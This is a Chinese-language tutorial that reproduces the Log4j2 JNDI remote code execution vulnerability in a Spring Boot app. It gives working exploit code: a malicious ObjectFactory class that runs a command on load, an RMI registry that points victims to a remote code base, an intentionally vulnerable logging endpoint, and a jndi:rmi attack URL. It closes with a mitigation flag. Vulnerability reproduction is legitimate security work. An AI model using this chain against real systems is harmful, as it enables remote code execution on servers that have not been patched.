# Log4j2 远程执行漏洞复现

## 描述

log4j2为了方便大家配置，提供jdni lookup的功能。可以使用${}包裹jdni查询表达方式，具体如下。
```xml
<File name="Application" fileName="application.log">
  <PatternLayout>
    <pattern>%d %p %c{1.} [%t] $${jndi:logging/context-name} %m%n</pattern>
  </PatternLayout>
</File>
```
正是上面lookup功能支持导致可以远程执行代码。

## 构建攻击

构建该攻击需要具备如下条件：

- 构造支持rmi、ldap协议的服务器，该服务提供攻击文件的下载地址。
- 构造支持下载攻击程序的服务器。
- 在日志打印信息中构造攻击。

## 具体步骤

1、准备spring-boot项目。可以通过spring官网提供的initializr来处理。

```html
https://start.spring.io/
```

2、修改项目的pom.xml，确保使用log4j2，项目中增加lombok，方便使用@Slf4j注解，来进行日志打印。

```xml
    <dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-web</artifactId>
			<exclusions>
				<exclusion>
					<groupId>org.springframework.boot</groupId>
					<artifactId>spring-boot-starter-logging</artifactId>
				</exclusion>
			</exclusions>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-log4j2</artifactId>
		</dependency>
		<dependency>
			<groupId>org.projectlombok</groupId>
			<artifactId>lombok</artifactId>
		</dependency>
```

3、准备攻击文件

```java
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.Hashtable;


//将编译好的类，复制到spring-boot的编译的target/static 目录下
public class Attack implements ObjectFactory {
    static {
        try {
            ProcessBuilder processBuilder = new ProcessBuilder();
          	// 构造攻击调用日历程序
            processBuilder.command("cal");
            Process process = processBuilder.start();
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                String line = null;
                while(null!= (line=reader.readLine())){
                    System.out.println(line);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return null;
    }
}
```

4、构造远程rmi服务

```java
//rmi端口
Registry registry = LocateRegistry.createRegistry(1099);
//注册获取远程信息，并连接攻击程序地址
Reference exploit = new Reference("Attack", "Attack", "http://127.0.0.1:8080/");
ReferenceWrapper refObjWrapper = new ReferenceWrapper(exploit);
//绑定服务
registry.bind("exploit", refObjWrapper);
```

5、构造日志打印接口

```java
    @GetMapping("log")
    String log(@RequestParam String message) {
      //${}可以由远程传入，一般为POST方式提交，此处为了简单使用get方式。
        log.error("${" + message + "}");
        return message;
    }
```

6、执行攻击

```bash
http://ip:port/log?message=jndi:rmi://ip:port/exploit
攻击途径：
由攻击者访问应用，应用访问攻击者提供rmi服务，rmi服务提供攻击程序，应用成功的下载并执行。
```

## 解决方案

```bash
jvm启动增加 -Dlog4j2.formatMsgNoLookups=true
```



 ## 实现代码参考

```bash
https://github.com/jiangwh/something
```

